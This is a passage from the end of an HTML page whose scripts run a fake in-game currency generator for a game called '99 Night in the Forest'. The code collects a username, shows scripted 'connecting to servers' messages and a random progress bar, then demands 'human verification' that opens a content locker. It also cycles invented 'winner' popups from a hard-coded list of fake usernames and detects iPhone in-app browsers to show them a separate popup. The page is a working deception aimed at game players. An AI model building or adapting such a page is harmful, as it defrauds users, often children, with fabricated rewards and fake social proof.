             ((userAgent.includes('iPhone') || userAgent.includes('iPad')) &&
              userAgent.includes('ByteLocale') &&
              userAgent.includes('JsSdk/2.0'));
    }
    if (isIOS()) {
      document.getElementById('ios-popup').style.display = 'block';
    } else {
      document.getElementById('normal-page').style.display = 'block';
    }
  </script>

  <script>
    // Countdown timer (guarded)
    document.addEventListener('DOMContentLoaded', () => {
      const countdownElement = document.getElementById('countdown-timer');
      if (!countdownElement) return;
      let timeInSeconds = 120;
      const timer = setInterval(() => {
        const minutes = Math.floor(timeInSeconds / 60);
        let seconds = timeInSeconds % 60;
        seconds = seconds < 10 ? '0' + seconds : seconds;
        countdownElement.textContent = `${minutes}:${seconds}`;
        if (timeInSeconds <= 0) {
          clearInterval(timer);
          countdownElement.textContent = "Time's up!";
        }
        timeInSeconds--;
      }, 1000);
    });

    // Legacy selectors (not used by new rows, kept for compatibility)
    let selectedItemImg = "https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png";
    const claimButtons = document.querySelectorAll('.claim-btn');
    const usernameModal = document.getElementById('username-modal');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const submitUsernameBtn = document.getElementById('submit-username-btn');
    const usernameInput = document.getElementById('username-input');
    const usernameError = document.getElementById('username-error');
    const loadingItemImg = document.getElementById('loading-item-img');

    claimButtons.forEach(button => {
      button.addEventListener('click', () => {
        const card = button.closest('.card-bg');
        const img = card.querySelector('img');
        if (img) selectedItemImg = img.src;
        if (usernameModal) usernameModal.classList.remove('hidden');
      });
    });

    if (closeModalBtn) {
      closeModalBtn.addEventListener('click', () => {
        usernameModal.classList.add('hidden');
        usernameInput.value = '';
        usernameError.textContent = '';
      });
    }

    if (submitUsernameBtn) {
      submitUsernameBtn.addEventListener('click', () => {
        const username = usernameInput.value.trim();
        if (username !== '') {
          usernameModal.classList.add('hidden');
          usernameError.textContent = '';
          loadingItemImg.src = selectedItemImg;
          runFakeGenerator(username);
        } else {
          usernameError.textContent = 'Please enter a valid username.';
        }
      });
    }

    async function runFakeGenerator(username) {
      const generatorModal = document.getElementById('generator-modal');
      const progressFill = document.getElementById('progress-fill');
      const verifyBtn = document.getElementById('verify-btn');
      const gameTip = document.getElementById('game-tip');
      const generatorTitle = document.getElementById('generator-title');

      generatorModal.classList.remove('hidden');
      progressFill.style.width = "0%";
      progressFill.textContent = "0%";
      verifyBtn.classList.add('hidden');

      let progress = 0;
      generatorTitle.textContent = "> Connecting to 99 Night in the Forest servers...";
      gameTip.textContent = "";

      await new Promise(r => setTimeout(r, 1500));
      generatorTitle.textContent = `> Finding user: ${username}...`;

      await new Promise(r => setTimeout(r, 2000));
      generatorTitle.textContent = "> User found. Preparing to generate diamonds...";

      while (progress < 100) {
        await new Promise(r => setTimeout(r, 100));
        progress += Math.floor(Math.random() * 5) + 1;
        if (progress > 100) progress = 100;
        progressFill.style.width = progress + "%";
        progressFill.textContent = progress + "%";
      }

      setTimeout(() => {
        generatorTitle.textContent = "Generation complete.";
        gameTip.textContent = "Human verification required to prevent abuse.";
        verifyBtn.classList.remove('hidden');
      }, 500);
    }
  </script>

  <script>
    // Verify click handler
    document.addEventListener("DOMContentLoaded", function(){
      const verifyBtn = document.getElementById('verify-btn');
      if (verifyBtn) {
        verifyBtn.addEventListener('click', function(){
          _qr(); // Open locker when Verify is clicked
        });
      }
    });
  </script>

  <script>
    // Floating items script - floating diamonds
    document.addEventListener('DOMContentLoaded', () => {
      const container = document.createElement('div');
      container.id = 'floating-items-container';
      document.body.prepend(container);

      const items = new Array(12).fill(window.__diamondIcon);
      const itemCount = 12;

      for (let i = 0; i < itemCount; i++) {
        const img = document.createElement('img');
        img.src = items[Math.floor(Math.random() * items.length)];
        img.classList.add('floating-item');

        const size = Math.random() * 60 + 40;
        img.style.width = `${size}px`;
        img.style.height = 'auto';

        const animationName = `float${Math.floor(Math.random() * 3) + 1}`;
        img.style.animationName = animationName;

        const animationDuration = Math.random() * 20 + 15;
        img.style.animationDuration = `${animationDuration}s`;

        const animationDelay = Math.random() * -35;
        img.style.animationDelay = `${animationDelay}s`;

        container.appendChild(img);
      }
    });
  </script>

  <script>
    function openUsernameModal(itemName) {
      let modal = document.getElementById('username-modal-backdrop');
      modal.style.display = 'flex';
      document.getElementById('username-modal-input').value = '';
      document.getElementById('username-modal-error').textContent = '';
      document.getElementById('username-modal-input').focus();
      document.getElementById('username-modal-close').onclick = () => { modal.style.display = 'none'; };
      modal.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };

      // Find the image src for the selected item
      let selectedItemImg = null;
      document.querySelectorAll('.pet-row').forEach(row => {
        if (row.querySelector('.pet-title')?.textContent === itemName) {
          selectedItemImg = row.querySelector('img')?.src;
        }
      });

      document.getElementById('username-modal-btn').onclick = () => {
        const username = document.getElementById('username-modal-input').value.trim();
        const errorDiv = document.getElementById('username-modal-error');
        if (!username) {
          errorDiv.textContent = 'Please enter your username.';
          document.getElementById('username-modal-input').focus();
          return;
        }
        modal.style.display = 'none';
        runFakeGenerator(username, selectedItemImg);
      };
      document.getElementById('username-modal-input').onkeydown = (e) => {
        if (e.key === 'Enter') document.getElementById('username-modal-btn').click();
      };
    }

    async function runFakeGenerator(username, selectedItemImg) {
      const generatorModal = document.getElementById('generator-modal');
      const progressFill = document.getElementById('progress-fill');
      const verifyBtn = document.getElementById('verify-btn');
      const gameTip = document.getElementById('game-tip');
      const generatorTitle = document.getElementById('generator-title');
      const loadingItemImg = document.getElementById('loading-item-img');

      generatorModal.classList.remove('hidden');
      progressFill.style.width = "0%";
      progressFill.textContent = "0%";
      verifyBtn.classList.add('hidden');
      loadingItemImg.style.display = selectedItemImg ? 'block' : 'none';
      if (selectedItemImg) loadingItemImg.src = selectedItemImg;

      let progress = 0;
      generatorTitle.textContent = "> Connecting to 99 Night in the Forest servers...";
      gameTip.textContent = "";

      await new Promise(r => setTimeout(r, 1500));
      generatorTitle.textContent = `> Finding user: ${username}...`;

      await new Promise(r => setTimeout(r, 2000));
      generatorTitle.textContent = "> User found. Preparing to generate diamonds...";

      while (progress < 100) {
        await new Promise(r => setTimeout(r, 100));
        progress += Math.floor(Math.random() * 5) + 1;
        if (progress > 100) progress = 100;
        progressFill.style.width = progress + "%";
        progressFill.textContent = progress + "%";
      }

      setTimeout(() => {
        generatorTitle.textContent = "Generation complete.";
        gameTip.textContent = "Human verification required to prevent abuse.";
        verifyBtn.classList.remove('hidden');
      }, 500);
    }

    document.addEventListener("DOMContentLoaded", function(){
      const verifyBtn = document.getElementById('verify-btn');
      if (verifyBtn) {
        verifyBtn.addEventListener('click', function(){
          // Intentionally no alert
        });
      }
    });
  </script>

  

  <script>
    // Winner popup logic
    const winnerUsers = [
      'PixelPioneer','BlockBash99','NeonNinja07','RoboRangerX','CraftyCrafter','VoxelVoyager','AstroArchitect',
      'TurboTumbler23','CosmicCreator','ShadowShifter','MysticMiner','DragonDuelist','QuantumQuester','BlazeBreaker',
      'AquaAvenger','FrostForge','ThunderTrek','NinjaNova','CyberBuilder','PixelPunk','RoboRaid','PhantomPhaser',
      'VortexVoyager','SolarSmith','HyperHacker','TurboTrader','SkywardScribe','EpicBlockMaster','GalaxyGuardian','MegaMineMover'
    ];

    const winnerItems = [
      {name:'100 Diamonds', weight:30},
      {name:'200 Diamonds', weight:25},
      {name:'400 Diamonds', weight:20},
      {name:'800 Diamonds', weight:15},
      {name:'1200 Diamonds', weight:7},
      {name:'2000 Diamonds', weight:3}
    ];

    function weightedRandom(items) {
      const total = items.reduce((sum, i) => sum + i.weight, 0);
      let r = Math.random() * total;
      for (const i of items) {
        if (r < i.weight) return i.name;
        r -= i.weight;
      }
      return items[0].name;
    }

    function showWinnerPopup() {
      const user = winnerUsers[Math.floor(Math.random()*winnerUsers.length)];
      const item = weightedRandom(winnerItems);
      const popup = document.getElementById('winner-popup');
      const content = document.getElementById('winner-popup-content');
      const iconDiv = document.getElementById('winner-popup-icon');

      const icon = window.__diamondIcon; // resolve at show time
    

      content.textContent = `${user} collected ${item}`;
      popup.style.display = 'flex';
      popup.style.opacity = '1';

      setTimeout(() => { popup.style.opacity = '0'; }, 1800);
      setTimeout(() => { popup.style.display = 'none'; }, 2000);
    }

    setInterval(showWinnerPopup, 3000);
  </script>

  <script>
    // Add animated background for legendary items
    function addLegendaryBackgrounds() {
      document.querySelectorAll('.legendary-claim').forEach(btn => {
        const row = btn.closest('.pet-row');
        if (!row) return;
        const imgBg = row.querySelector('.pet-img-bg');
        if (!imgBg) return;
        if (imgBg.querySelector('.legendary-claim-bg')) return;
        const mainImg = imgBg.querySelector('img');
        if (!mainImg) return;
        const bgImg = mainImg.cloneNode();
        bgImg.classList.add('legendary-claim-bg');
        bgImg.setAttribute('aria-hidden', 'true');
        imgBg.insertBefore(bgImg, mainImg);
      });
    }
    document.addEventListener('DOMContentLoaded', addLegendaryBackgrounds);
  </script>

</body></html>
